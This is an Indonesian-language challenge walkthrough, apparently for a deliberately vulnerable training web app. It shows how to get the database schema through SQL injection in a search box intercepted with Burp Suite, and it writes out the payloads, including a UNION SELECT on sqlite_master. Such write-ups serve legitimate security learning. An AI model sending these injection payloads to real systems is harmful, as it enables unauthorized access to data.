1. Untuk menyelesaikan challenge ini perlu ditemukan DB schema terlebih dahulu. Gunakan input field search box lalu intercept pada Burp-suite <br />
<img width="1873" height="983" alt="image" src="https://github.com/user-attachments/assets/8f21e0b5-2769-4ff4-b132-45521c15500e" /> <br />

2. Ketika melakukan pencarian di search box, requestnya seperti ini. <br />
   <img width="1894" height="1162" alt="image" src="https://github.com/user-attachments/assets/9d8582f8-0424-4ff9-a114-ff37e8a2f29a" /> <br />

3. Intercept menggunakan `apple'))-- ` <br />
   <img width="1904" height="1151" alt="image" src="https://github.com/user-attachments/assets/362d7a66-8884-4424-a036-fc778bf826bc" /> <br />

4. Query berhasil. Selanjutnya kita cari tahu database schemanya dengan menggunakan `apple')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master --`<br />
   <img width="1897" height="1164" alt="image" src="https://github.com/user-attachments/assets/4e965457-bdda-49b5-9c0e-f27dcf72bd43" /> <br />
   <img width="1187" height="808" alt="image" src="https://github.com/user-attachments/assets/cce05625-0249-495f-a3f3-4cb575b797c8" /> <br />
Database schema berhasil didapatkan



   
